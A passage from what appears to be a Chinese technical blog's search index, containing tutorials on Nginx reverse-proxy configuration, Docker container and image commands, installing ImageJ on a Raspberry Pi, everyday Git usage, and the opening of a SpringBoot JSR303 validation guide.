sql:/etc/pki/nssdb* skipping SSL peer certificate verification* SSL connection using TLS_RSA_WITH_AES_256_CBC_SHA256* Server certificate:* subject: CN=www.example.cn* start date: 3月 19 00:00:00 2019 GMT* expire date: 3月 18 12:00:00 2020 GMT* common name: www.example.cn* issuer: CN=TrustAsia TLS RSA CA,OU=Domain Validated SSL,O="TrustAsia Technologies, Inc.",C=CN&gt; HEAD / HTTP/1.1&gt; User-Agent: curl/7.29.0&gt; Host: www.example.com&gt; Accept: */*&gt; Referer: https://www.sogou.com&gt;&lt; HTTP/1.1 403 ForbiddenHTTP/1.1 403 Forbidden&lt; Server: Nginx/2.2.3Server: Nginx/2.2.3&lt; Date: Thu, 02 Jan 2020 23:38:13 GMTDate: Thu, 02 Jan 2020 23:38:13 GMT&lt; Content-Type: text/htmlContent-Type: text/html&lt; Content-Length: 612Content-Length: 612&lt; Connection: keep-aliveConnection: keep-alive&lt;* Connection #0 to host www.example.com left intact Nginx 放宽 GET 请求中 URL 的最大长度限制 client_header_buffer_size 的默认值： client_header_buffer_size 1k large_client_header_buffers 的默认值： large_client_header_buffers 4 4k 123456789http { include mime.types; default_type application/octet-stream; client_header_buffer_size 512k; large_client_header_buffers 4 1m; ...} Nginx 反向代理响应超时解决方案Nginx 访问出现 504 Gateway Time-out，这一般是由于程序执行时间过长导致响应超时，例如程序需要执行 90 秒，而 Nginx 最大响应等待时间为 30 秒，这样就会出现超时。 12345location / { proxy_connect_timeout 1800s; #Nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 1800s; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 1800s; #连接成功后，后端服务器响应时间(代理接收超时)} Nginx 反向代理设置响应端口Nginx 默认反向代理后的端口为 80，因此存在取被代理后的端口为 80 的问题，这就可能会导致业务逻辑出错；主要原因是在 Nginx 的配置文件中， 配置 Host 属性时没有设置响应的端口。 1234567891011121314server { listen 8080; location /ime-server { proxy_pass http://ime-server/ime-server; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ...} 在如上的配置内容中，Host 属性只配置了 $host，没有对应的 port，这就导致在被代理的地方取得错误的端口，以 Java 代码为例： 1234String scheme = httpRequest.getScheme();String serverName = httpRequest.getServerName();int port = httpRequest.getServerPort();String requestURI = scheme+"://"+serverName+":"+port+"/ime-server/rest/"+serviceName+"/wmts"; 这时，Java 代码取得的 port 为 80，即使 Nginx 监听的端口为 8080。此时需要修改 Nginx 的配置文件，将 Host 属性后面的配置内容改为 $host:$server_port，配置示例如下： 1234567891011121314server { listen 8080; location /ime-server { proxy_pass http://ime-server/ime-server; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ...} Nginx 反向代理指定 404 页面Nginx 配置了反向代理后，若希望统一指定反向代理后的 404 页面，可以使用 proxy_intercept_errors 和 error_page 指令实现，更多内容可参考这里。 1234567891011121314151617181920212223http { proxy_intercept_errors on; error_page 404 /404.html; # 或者 # error_page 404 http://cloud.example.com; upstream www.example.com { server localhost:8080; } server { listen 80; server_name www.example.com; location / { proxy_pass http://www.example.com; index index.html index.htm; } }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"web服务器"},{title:"Docker 之三 Docker 容器管理命令",url:"/posts/99d66af5.html",text:'Docker 新建并启动容器1234567891011121314151617# 语法# docker run [OPTIONS] IMAGE [COMMAND] [ARG...]# 新建并以交互式启动centos容器，并为容器重新分配一个伪输入终端，同时指定容器名称# docker run -it --name="centos" centos /bin/bash# 新建并后台启动centos容器，如果启动后的容器内部没有前台运行的进程，容器默认会马上停止# docker run -d centos# 参数OPTIONS# --name="new-name" 或者 --name new-name：为容器指定一个名称，该名称会在执行"docker ps"的时候显示出来# -d：后台启动容器，并返回容器ID，即启动守护式容器# -i：以交互式运行容器，通常与-t同时使用# -t：为容器重新分配一个伪输入终端，通常与-i同时使用# -P：随机端口映射# -p：指定端口映射，有四种格式：ip:hostport:containerport、ip::containerport、hostport:containerport、containerport# --privileged=true：使用该参数指定容器内的root拥有真正的root权限，false代表容器内的root只拥有外部宿主机的一个普通用户权限 Docker 容器的重启策略123456789101112131415# --restart=no：表示当容器退出时不要自动重启，no是默认值# --restart=always：表示不管容器以什么退出状态码退出，总是尝试重启容器# --restart=on-failure:5：表示当容器以非0退出状态码退出时尝试重启容器，且最大尝试重启次数为5# --restart=unless-stopped – 表示不管容器以什么退出状态码退出，总是尝试重启容器；不过当daemon启动时，如果发现容器之前已经处于退出状态，则不会尝试启动容器# 设置容器重启策略为on-failure，且最大尝试重启次数为5# docker run -it --restart=on-failure:5 --name="centos" centos /bin/bash# 获取容器的重启次数# docker inspect -f "{{ .RestartCount }}" centos0# 获取容器上一次重启的时间# docker inspect -f "{{ .State.StartedAt }}" centos2019-01-27T03:54:44.510836372Z Docker 列出当前正在运行的容器123456789101112131415161718# 语法# docker ps [OPTIONS]# 显示当前正在运行的容器# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES04c9fdf618f6 1e1148e4cc2c "/bin/bash" 5 minutes ago Up 4 minutes hardcore_leavitt# 更改容器名称# docker rename old_container_name new_container_name# 参数OPTIONS# -a：显示所有正在运行的容器，包括历史上运行过的# -l：显示最近创建的容器# -n：列出最近创建的n个容器，例如“-n 5”# -s：显示总的文件大小# -q：静默模式，只显示容器编号# --no-trunc：不截断输出 Docker 断开与当前容器的连接12345678# 当以交互式启动容器时，容器停止，断开连接# exit# 当以交互式启动容器时，容器不停止，断开连接，使用以下组合快捷键ctrl + p + q# 当以后台方式启动容器时，直接断开连接即可，容器默认不会停止# exit Docker 在运行的容器中执行命令12345678910111213141516# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker exec [OPTIONS] CONTAINER COMMAND [ARG...]# 在ID为1a3941b6ae8e的容器中，开启一个交互模式的伪输入终端# docker exec -it 1a3941b6ae8e /bin/bash# 在ID为1a3941b6ae8e的容器中，以交互模式执行容器内的/root/monitor.sh脚本# docker exec -it 1a3941b6ae8e /bin/bash /root/monitor.sh# 在ID为1a3941b6ae8e的容器中，执行查询系统时间的命令# docker exec -t 1a3941b6ae8e date# 参数OPTIONS# -d：守护式运行，即在后台运行# -i：以交互式运行容器，通常与-t同时使用# -t：为容器重新分配一个伪输入终端，通常与-i同时使用 Docker 连接到正在运行的容器1234567891011# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker attach [OPTIONS] CONTAINER# 连接到ID为1a3941b6ae8e的容器# docker attach 1a3941b6ae8e# 或者执行以下命令，在ID为1a3941b6ae8e的容器中，开启一个交互模式的伪输入终端（推荐此方式）# docker exec -it 1a3941b6ae8e /bin/bash# 参数OPTIONS# --sig-proxy=false：确保CTRL-D或CTRL-C不会关闭容器 Docker 启动、重启、停止、强制停止容器1234567891011121314151617# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker start [OPTIONS] CONTAINER [CONTAINER...]# docker restart [OPTIONS] CONTAINER [CONTAINER...]# docker stop [OPTIONS] CONTAINER [CONTAINER...]# docker kill [OPTIONS] CONTAINER [CONTAINER...]# 启动ID为1a3941b6ae8e的容器# docker start 1a3941b6ae8e# 重启ID为1a3941b6ae8e的容器# docker restart 1a3941b6ae8e# 停止ID为1a3941b6ae8e的容器# docker stop 1a3941b6ae8e# 强制停止ID为1a3941b6ae8e的容器# docker kill 1a3941b6ae8e Docker 删除容器12345678910111213141516171819# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker rm [OPTIONS] CONTAINER [CONTAINER...]# 删除ID为1a3941b6ae8e的容器# docker rm 1a3941b6ae8e# 强制删除ID为1a3941b6ae8e的容器，即使容器正在运行# docker rm -f 1a3941b6ae8e# 批量删除容器，第一种写法# docker rm $(docker ps -aq)# 批量删除容器，第二种写法# docker ps -aq | xargs docker rm# 参数OPTIONS# -f：通过SIGKILL信号强制删除一个运行中的容器# -l：移除容器间的网络连接，而非容器本身# -v：删除与容器关联的卷 Docker 显示容器内部的日志信息123456789101112131415161718# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker logs [OPTIONS] CONTAINER# 显示ID为1a3941b6ae8e的容器的内部日志信息# docker logs 1a3941b6ae8e# 跟踪显示ID为1a3941b6ae8e的容器的内部日志信息# docker logs -t -f --tail 5 1a3941b6ae8e# 停止日志输出，使用以下组合快捷键ctrl + c# 参数OPTIONS# -t：加入时间戳# -f：跟踪最新的日志打印# --since：显示某个开始时间的所有日志# --until：显示某个结束时间之前的所有日志# --tail：仅列出最新的N条日志，例如 --tail 5 Docker 显示容器内部运行的进程12345# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker top CONTAINER [ps OPTIONS]# 显示ID为1a3941b6ae8e的容器的内部进程# docker top 1a3941b6ae8e Docker 容器与宿主机互相拷贝文件12345678910# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-# docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH# 从ID为1a3941b6ae8e的容器中，拷贝文件/root/anaconda-ks.cfg到宿主机的/root目录下# docker cp 1a3941b6ae8e:/root/anaconda-ks.cfg /root# 将宿主机的/root/monitor.log文件，拷贝到ID为1a3941b6ae8e的容器的/root目录下# docker cp /root/monitor.log 1a3941b6ae8e:/root Docker 显示容器的内部细节12345678910# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker inspect [OPTIONS] NAME|ID [NAME|ID...]# 显示ID为1a3941b6ae8e的容器的内部细节# docker inspect 1a3941b6ae8e# 参数OPTIONS# -f：指定返回值的模板文件# -s：显示总的文件大小# --type：返回指定类型的JSON Docker 新建并启动 Tomcat 容器1234567891011121314151617181920# 下载最新的Tomcat镜像（可能基于Debian/Alpine/Centos、依赖OpenJDK）# docker pull tomcat# 前台方式新建并启动Tomcat容器，指定映射端口# docker run -it -p 8888:8080 --name="tomcat8.5" tomcat# 前台方式新建并启动Tomcat容器，随机映射端口# docker run -it -P --name="tomcat8.5" tomcat# 前台方式新建并启动Tomcat容器，可以使用快捷键断开连接，不停止Tomcat容器ctrl + p + q# 后台方式新建并启动Tomcat容器，指定映射端口# docker run -d -p 8888:8080 --name="tomcat8.5" tomcat# 后台方式新建并启动Tomcat容器，随机映射端口# docker run -d -P --name="tomcat8.5" tomcat# 无论前台还是后台方式启动Tomcat容器，都可以执行以下命令连接到Tomcat容器，进一步配置Tomcat服务器# docker exec -it tomcat8.5 /bin/bash Docker 提交容器副本，生成新的 Docker 镜像12345678910111213141516# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]# 提交容器副本作为一个新的镜像# docker commit -a "peter@163.com" -m "first commit" 1a3941b6ae8e peter/mytomcat:8.5# 查看刚创建的新镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/mytomcat 8.5 1ca4c9763049 16 seconds ago 475MB# 参数OPTIONS# -a：提交镜像的作者# -c：使用Dockerfile指令来创建镜像# -m：提交时的说明文字# -p：在commit的时候暂停容器，默认选项 Docker 新建并后台启动容器的介绍一. Docker 新建并后台启动容器（“docker run -d xxxx”），然后通过命令”docker ps -a” 进行查看，会发现容器已经退出；这里必须注意的是，Docker 容器后台启动之后，就必须有一个前台进程。容器启动的命令，如果不是那些一直挂器起的命令（top、tail），默认就是会自动停止。 二。以 Nginx 为例，正常情况下配置启动服务只需要启动相应的 Service 即可，例如执行命令”systemctl start nginx”。但是这样做，Nginx 如果以后台进程模式运行，会导致 Docker 前台没有运行的应用；这样的容器在后台启动后，会立即自杀，因为容器觉得自身没事可做了；这一点与 Supervistor 配置程序后台运行很相似。所以，最佳的解决方案是将需要运行的程序以前台进程的形式运行。 三。实践操作 12345678910111213141516# 新建并后台启动centos容器，并在前台执行指定的shell脚本# docker run -d centos /bin/sh -c "while true;do echo hello docker;sleep 2;done"1a3941b6ae8e# 显示当前正在运行的容器，发现刚才以后台方式启动的容器不会再自动停止# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1a3941b6ae8e centos "/bin/sh -c \'while t…" 11 minutes ago Up 11 minutes infallible_haslett# 跟踪显示ID为1a3941b6ae8e的容器的内部日志信息# docker logs -f -t --tail 5 1a3941b6ae8e2018-12-24T19:06:07.180718501Z hello docker2018-12-24T19:06:09.185193606Z hello docker2018-12-24T19:06:11.189919184Z hello docker2018-12-24T19:06:13.193004892Z hello docker2018-12-24T19:06:15.196940992Z hello docker Docker 常用命令图解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之二 Docker 镜像管理命令",url:"/posts/77134a0f.html",text:'Docker 帮助命令123456789101112# 查看Docker的版本# docker version# 查看Docker的详细信息# docker info# 查看Docker的命令帮助手册# docker --help# 查看Docker具体某个操作的命令帮助手册# docker images --help# docker search --help Docker 镜像查看命令1234567891011121314# 语法# docker images [OPTIONS] [REPOSITORY[:TAG]]# 查看本地所有镜像的列表# docker images# 查看本地某个镜像的信息# docker images centos# 参数OPTIONS# -a：列出本地所有的镜像（含中间映像层）# -q：只显示本地所有镜像的镜像ID# --no-trunc：不截断输出# --digests：显示镜像的摘要信息 Docker 镜像搜索命令12345678910111213# 语法# docker search [OPTIONS] TERM# 搜索Docker-Hub中的镜像# docker search tomcat# 参数OPTIONS# --no-trunc：不截断输出# --limit：限制搜索结果的条目数量，默认值是25，例如“--limit 15”# --filter：加上过滤条件进行搜索# --filter=stars=3：列出点赞数不小于指定值的镜像# --filter "is-official=true"： 只列出Docker官方发布的镜像# --filter "is-automated=true"： 只列出automated build类型的镜像 Docker 镜像下载命令123456789101112# 语法# docker pull [OPTIONS] NAME[:TAG|@DIGEST]# 下载Tomcat镜像，默认下载latest版本# docker pull tomcat# 下载指定版本的Tomcat镜像# docker pull tomcat:8.0# 参数OPTIONS# -a：拉取所有tagged镜像# --disable-content-trust：忽略镜像的校验，默认开启 Docker 镜像删除命令123456789101112131415161718192021# 语法# docker rmi [OPTIONS] IMAGE [IMAGE...]# 删除指定的镜像，默认删除latest版本# docker rmi hello-world# 强制删除指定的镜像，默认删除latest版本# docker rmi -f hello-world# 根据镜像ID删除镜像# docker rmi 4ab4c602aa5e# 删除多个镜像，默认删除latest版本# docker rmi tomcat nginx# 删除本地所有镜像# docker rmi $(docker images -qa)# 参数OPTIONS# -f：强制删除，即使镜像对应的容器实例正在运行# --no-prune：不移除该镜像的过程镜像，默认移除 批量删除镜像12# 清理所有不被使用的镜像，正在使用的镜像和容器不会被删除，但是这个命令切忌慎用，因为它把整个docker空间都释放掉，即所有不被正在使用的镜像和容器都会被删除# docker system prune -a 构建 Docker 镜像12# 根据指定的Dockerfile构建新的镜像，peter/centos是新镜像的名称，1.1是tag（版本号）# docker build -f ~/dockerfile-centos -t peter/centos:1.1 . Docker 命令帮助手册推荐菜鸟教程 - Docker 命令大全 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"基于树莓派安装 ImageJ",url:"/posts/67ba58dd.html",text:'ImageJ 介绍 一个基于 Java 的公共的图像处理软件 ImageJ Github Repo ImageJ WiKi ImageJ 安装1234567891011121314151617181920212223242526272829# 硬件： Raspberry 3B# 系统： Raspbian-Stretch（基于Debian-Stretch）# 更新系统（可省略）# apt-get update# apt-get upgrade# apt-get clean# 查看当前JDK的版本号（官方最新的Raspbian系统默认已安装Open-JDK8）# java -version# 下载Fiji-nojre，并解压# cd /home/pi/Downloads# wget http://downloads.imagej.net/fiji/latest/fiji-nojre.zip# unzip fiji-nojre.zip# 下载ImageJ脚本，并授权执行# cd /home/pi/Downloads# git clone https://github.com/imagej/imagej.git# cd /home/pi/Downloads/imagej/bin# chmod +x ImageJ.sh# 拷贝Fiji的Jar包到ImageJ目录下# cd /home/pi/Downloads# cp -r Fiji.app/jars imagej/# 运行ImageJ# cd /home/pi/Downloads/imagej/bin# ./ImageJ.sh 参考文献 https://imagej.net/Raspberry_Pi https://imagej.net/Fiji/Downloads#Installation https://imagej.nih.gov/ij/docs/install/linux.html https://groups.google.com/forum/#!topic/fiji-devel/eIF82i4shC0 http://forum.imagej.net/t/how-to-run-fiji-at-raspberry-pi-3/4743/11 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"树莓派"},{title:"互联网时代下的架构殿堂之路",url:"/posts/a570a16.html",text:'架构思维：互联网架构升级演进 架构进阶：互联网架构之升级改造 架构突破：高可用弹性伸缩的云架构之迁移改造 架构殿堂：高可用弹性伸缩的云架构之高并发实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"Git 之一 Git 常用命令",url:"/posts/e3228f73.html",text:'Git 的四个工作区域 Git 初始化本仓库123456789101112131415161718192021222324252627282930313233# 创建本地测试库的目录$ mkdir test_repo$ cd test_repo# 初始化本地库$ git init# 初始化后的目录结构$ tree -al ../test_repotest_repo/└── .git ├── branches ├── config ├── description ├── HEAD ├── hooks │&nbsp;&nbsp; ├── applypatch-msg.sample │&nbsp;&nbsp; ├── commit-msg.sample │&nbsp;&nbsp; ├── post-update.sample │&nbsp;&nbsp; ├── pre-applypatch.sample │&nbsp;&nbsp; ├── pre-commit.sample │&nbsp;&nbsp; ├── prepare-commit-msg.sample │&nbsp;&nbsp; ├── pre-push.sample │&nbsp;&nbsp; ├── pre-rebase.sample │&nbsp;&nbsp; └── update.sample ├── info │&nbsp;&nbsp; └── exclude ├── objects │&nbsp;&nbsp; ├── info │&nbsp;&nbsp; └── pack └── refs ├── heads └── tags Git 配置签名（本地库）这里的签名仅仅是为了方便标识提交代码的作者身份，并不用于 Git 远程库（Github）的身份认证（例如 Github 登录） 局部 12345678910111213141516171819202122$ cd git_test# 查看命令帮助手册$ git config --help# 配置仓库级别签名，仅在当前本地库范围内有效$ git config user.name peter$ git config user.email peter@gmail.com# 仓库级别签名配置信息的保存位置$ cat .git/config[user] name = peter email = peter@gmail.com# 查看当前仓库级别签名$ git config --get user.name$ git config --get user.email# 重置当前仓库级别签名$ git config --unset user.name$ git config --unset user.email 全局 12345678910111213141516171819202122# 配置系统用户级别签名（全局有效）$ git config --global user.name peter_glb$ git config --global user.email peter@gmail.com# 系统用户级别签名配置信息的保存位置$ cat ~/.gitconfig[user] name = peter_glb email = peter@gmail.com# 查看系统用户级别签名$ git config --global --get user.name$ git config --global --get user.email# 重置系统用户级别签名$ git config --global --unset user.name$ git config --global --unset user.email# 签名级别优先级说明# 就近原则，仓库级别签名优先于系统用户级别签名，二者都有时采用仓库级别签名# 如果只存在系统用户级别签名，则以系统用户级别签名为准# 二者不允许同时为空 Git 操作新建的文件（本地库）1234567891011121314151617# 显示工作区和暂存区的状态$ git status# 添加新文件到暂存区，建立文件跟踪$ git add api.json# 将新文件从暂存区撤出，取消文件跟踪$ git rm --cached api.json# 批量将新文件添加到暂存区$ git add --all# 将新文件从暂存区提交到本地库，并指定提交的备注信息$ git commit api.json -m \'create message\'# 或者批量将新文件从暂存区提交到本地库，并指定提交的备注信息$ git commit -am "create message" Git 操作修改过的文件（本地库）12345678910111213141516171819# 将已提交到本地库，且在本地修改过的文件（未提交到暂存区），直接丢弃工作区的改动还原为修改前的内容$ git checkout -- api.json# 将已提交到本地库，且在本地修改过的文件再次提交到暂存区# 这里可以执行“git commit”直接提交到本地库，省略"git add"操作，但这样就不能从暂存区撤回修改前的内容$ git add api.json# 将已提交到本地库，且在本地修改过与提交到暂存区的文件，从暂存区撤出$ git reset HEAD api.json# 批量将已提交到本地库，且在本地修改过的文件再次提交到暂存区# 这里可以执行“git commit”直接提交到本地库，省略"git add"操作，但这样以后就不能从暂存区恢复数据，强烈不建议使用$ git add --all# 将已提交到本地库，且在本地修改过与提交到暂存区的文件，再次提交到本地库$ git commit api.json -m \'update message\'# 批量将已提交到本地库，且在本地修改过与提交到暂存区的文件，再次提交到本地库$ git commit -am "update message" Git 忽略追踪已提交过的文件与文件夹123456789101112131415# 创建.gitignore文件$ touch .gitignore# 编辑.gitignore文件，然后添加需要被忽略提交的文件或者文件夹的路径$ vim .gitignore# .gitignore只能忽略那些原来没有被追踪的文件，如果某些文件已经被纳入了版本管理中（即已经被commit过），那么通过.gitignore文件是无法实现忽略提交的# 此时需要先把本地缓存删除（改变成未追踪状态）再重新提交，如文件或者文件夹删除不掉，可以加上 -f 参数强制删除，但是一定要加上 --cached 表示只删除缓冲文件# 若忽略提交的是文件夹，必须可以加上 -r 参数，表示忽略提交文件夹下的所有文件$ git rm --cached shop.cpp$ git rm -f --cached shop.cpp$ git rm -r -f --cached store/# 提交$ git add --all &amp;&amp; git commit -am \'Cancel tracking file\' Git 设置代理1234567891011121314151617# 设置当前仓库的HTTP代理$ git config http.proxy http://192.168.1.122:1080# 设置全局的HTTP代理$ git config --global http.proxy 192.168.1.122:1080#设置当前仓库的Socks5代理$ git config http.proxy socks5://192.168.1.122:1081#设置全局的Socks5代理$ git config --global http.proxy socks5://192.168.1.122:1081# 取消当前仓库的代理$ git config --unset http.proxy# 取消全局的代理$ git config --global --unset http.proxy Git 设置用户名、邮箱1234567891011121314151617# 查看当前仓库的配置信息$ git config --list# 查看全局的配置信息$ git config --list --global# 设置当前仓库的用户名、邮箱$ git config user.name clay$ git config user.email example@qq.com# 设置全局的用户名、邮箱$ git config --global user.name clay$ git config --global user.email example@qq.com# 取消设置全局的用户名、邮箱$ git config --global --unset user.name$ git config --global --unset user.email Git 更改最后一次提交的信息12345678# 更改最后一次提交的备注信息$ git commit --amend# 更改最后一次提交的用户名，这里相当于指定 "user.name"$ git commit --amend --author=clay# 更改最后一次提交的日期，第一个日期是提交日期，第二个日期是作者日期$ GIT_COMMITTER_DATE="2021-02-04T12:32:03" git commit --amend --date="2021-02-04T12:32:03" Git 撤销提交并清除痕迹123456789101112# 撤销最近前4次的提交，其中4表示撤销最近前几次提交$ git reset --hard HEAD~4# 也可以指定commit_id，表示撤销某次提交（6ddd44e）之前的所有提交$ git reflog$ git reset --hard 6ddd44e# 强制更新远程的提交历史$ git push -f# 或者强制更新特定分支的提交历史$ git push origin master -f var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制"},{title:"SpringBoot 整合 JSR303 参数校验",url:"/posts/79765625.html",text:'前言在日常开发中，避不开的就是参数校验，有人说前端不是会在表单提交之前进行校验的吗？在后端开发中，不管前端怎么样校验，后端都需要进行再次校验，这是为了系统安全。因为前端的校验很容易被绕过，当使用 PostMan 来测试时，如果后端没有校验，容易引发安全问题。值得一提的是，本文适用于 Spring Boot 与 Spring Cloud 项目。 JSR303 简介JSR-303 是 JAVA EE 6 中的一项子规范，叫做 Bean Validation，官方的参考实现是 Hibernate Validator。值得一提的是，Hibernate Validator 提供了 JSR-303 规范中所有内置 Constraint 的实现，除此之外还有一些附加的 Constraint。 常用约束注解 约束注解的名称 约束注解的说明 @Null 用于校验对象为 Null @NotNull 用于校验对象不能为 Null，无法校验长度为 0 的字符串 @NotBlank 用于校验 String 类，不能为 Null，且 trim() 之后的 size 大于零 @NotEmpty 用于校验集合类、String 类不能为 Null，且 size 大于零，但是带有空格的字符串校验不出来 @Size 用于校验对象（Array、Collection、Map、String）长度是否在给定的范围之内 @Length 用于校验 String 对象的大小必须在指定的范围内 @Pattern 用于校验 String 对象是否符合正则表达式的规则 @Email 用于校验 String 对象是否符合邮箱格式 @Min 用于校验 Number 和 String 对象是否大等于指定的值 @Max 用于校验 Number 和 String 对象是否小等于指定的值 @AssertTrue 用于校验 Boolean 对象是否为 true @AssertFalse 用于校验 Boolean 对象是否为 false 常用校验注解校验注解有两个，分别是 @Validated 与 @Valid，两者的区别如下： @Validated 注解： Spring 提供的 支持分组校验 可以用在类型、方法和方法参数上，但是不能用在成员对象属性上 由于无法加在成员对象属性上，所以无法单独完成级联校验，需要配合 @Valid 一起使用 @Valid 注解： JDK 提供的（标准 JSR-303 规范） 不支持分组校验 可以用在方法、构造函数、方法参数和成员对象属性上 可以加在成员对象属性上，能够独自完成级联校验 提示 @Validated 注解一般是用到分组校验时才使用。 一个学校对象里有很多个学生对象，学校和学生都需要校验参数；此时可以在学校的 Controller 类的方法参数前添加 @Validated 注解，同时在学校对象的学生属性上添加 @Valid 注解，不加则无法对学生对象里的属性进行校验。示例代码如下： 123456789101112@Datapublic class School { private Long id; @NotBlank private String name; @Valid // 需要加上，否则不会验证Student类中的约束注解 @NotNull // 且需要触发该字段的验证才会进行级联校验 private List&lt;Student&gt; list;} 123456789@Datapublic class Student { private Long id; @NotBlank private String name; } 12345678910@RestController@RequestMapping("/school")public class SchoolController { @PostMapping("/add") public Result add(@Validated @RequestBody School school){ }} JSR303 入门整合案例引入 Maven 依赖1234567891011&lt;dependency&gt; &lt;groupId&gt;javax.validation&lt;/groupId&gt; &lt;artifactId&gt;validation-api&lt;/artifactId&gt; &lt;version&gt;2.0.1.Final&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.hibernate.validator&lt;/groupId&gt; &lt;artifactId&gt;hibernate-validator&lt;/artifactId&gt; &lt;version&gt;8.0.0.Final&lt;/version&gt;&lt;/dependency&gt; 统一返回类型为了统一返回给前端的结果格式，应该定义一个返回结果类。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 返回结果 */public class R extends HashMap&lt;String, Object&gt; { private static final long serialVersionUID = 1L; public R() { put("code", 0); put("msg", "success"); } public static R error() { return error(HttpStatus.SC_INTERNAL_SERVER_ERROR, "系统未知异常，请联系管理员"); } public static R error(String msg) { return error(HttpStatus.SC_INTERNAL_SERVER_ERROR, msg); } public static R error(int code, String msg) { R r = new R(); r.put("code", code); r.put("msg", msg); return r; } public static R ok(String msg) { R r = new R(); r.put("msg", msg); return r; } public static R ok(Map&lt;String, Object&gt; map) { R r = new R(); r.putAll(map); return r; } public static R ok() { return new R(); } public R put(String key, Object value) { super.put(key, value); return this; } } 添加约束注解在 JavaBean（例如 